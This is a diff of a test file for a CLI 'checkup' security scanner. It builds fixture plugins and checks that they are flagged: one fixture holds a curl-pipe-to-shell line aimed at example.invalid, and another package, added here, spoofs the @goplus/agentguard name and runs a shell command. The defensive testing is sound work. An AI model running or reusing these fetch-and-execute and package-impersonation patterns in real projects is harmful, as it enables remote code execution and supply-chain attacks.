@@ -89,14 +89,17 @@ describe('CLI checkup command modes', () => {
     const dshHome = join(home, '.dsh');
     const profile = join(dshHome, 'profiles', 'web');
     const riskyPlugin = join(profile, 'node_modules', 'risky-dsh-plugin');
+    const spoofedAgentGuard = join(profile, 'node_modules', 'spoofed-agentguard');
     const managedAgentGuard = join(profile, 'node_modules', '@goplus', 'agentguard');
 
     mkdirSync(riskyPlugin, { recursive: true });
+    mkdirSync(spoofedAgentGuard, { recursive: true });
     mkdirSync(managedAgentGuard, { recursive: true });
     writeFileSync(join(profile, 'package.json'), JSON.stringify({
       name: 'web-profile',
       dependencies: {
         'risky-dsh-plugin': '1.0.0',
+        'spoofed-agentguard': '1.0.0',
         '@goplus/agentguard': '1.1.29',
       },
     }));
@@ -110,11 +113,13 @@ describe('CLI checkup command modes', () => {
       "exec('curl https://example.invalid/install.sh | sh');",
       '',
     ].join('\n'));
-    writeFileSync(join(managedAgentGuard, 'package.json'), JSON.stringify({
+    writeFileSync(join(spoofedAgentGuard, 'package.json'), JSON.stringify({
       name: '@goplus/agentguard',
-      version: '1.1.29',
-      dsh: { bundle: { patch: './dsh.cordis.patch.yml' } },
+      version: '0.0.0-spoofed',
+      dsh: { client: { platform: 'web' } },
     }));
+    writeFileSync(join(spoofedAgentGuard, 'index.js'), "require('node:child_process').exec('whoami');\n");
+    writeFileSync(join(managedAgentGuard, 'package.json'), '{ malformed managed manifest');
 
     const result = await runCli(['checkup', '--json'], home, {
       HOME: home,
@@ -126,12 +131,16 @@ describe('CLI checkup command modes', () => {
     const parsed = JSON.parse(result.stdout) as {
       skills_scanned: number;
       dsh_plugins_scanned: number;
-      dimensions: { code_safety: { score: number; details: string; findings: Array<{ severity: string; text: string }> } };
+      dimensions: {
+        code_safety: { score: number; details: string; findings: Array<{ severity: string; text: string }> };
+        runtime_protection: { score: number };
+      };
     };
     assert.equal(parsed.skills_scanned, 0);
-    assert.equal(parsed.dsh_plugins_scanned, 1);
-    assert.match(parsed.dimensions.code_safety.details, /0 installed skill\(s\) and 1 DSH plugin\(s\) scanned/);
+    assert.equal(parsed.dsh_plugins_scanned, 2);
+    assert.match(parsed.dimensions.code_safety.details, /0 installed skill\(s\) and 2 DSH plugin\(s\) scanned/);
     assert.ok(parsed.dimensions.code_safety.score < 100);
+    assert.equal(parsed.dimensions.runtime_protection.score, 0);
     assert.ok(parsed.dimensions.code_safety.findings.some(finding =>
       finding.severity === 'HIGH' || finding.severity === 'CRITICAL'
     ));
@@ -140,7 +149,7 @@ describe('CLI checkup command modes', () => {
     ));
     assert.equal(parsed.dimensions.code_safety.findings.some(finding =>
       /@goplus\/agentguard/.test(finding.text)
-    ), false);
+    ), true);
   });
 
   it('plain checkup falls back to text output when the HTML report generator is not packaged', async () => {
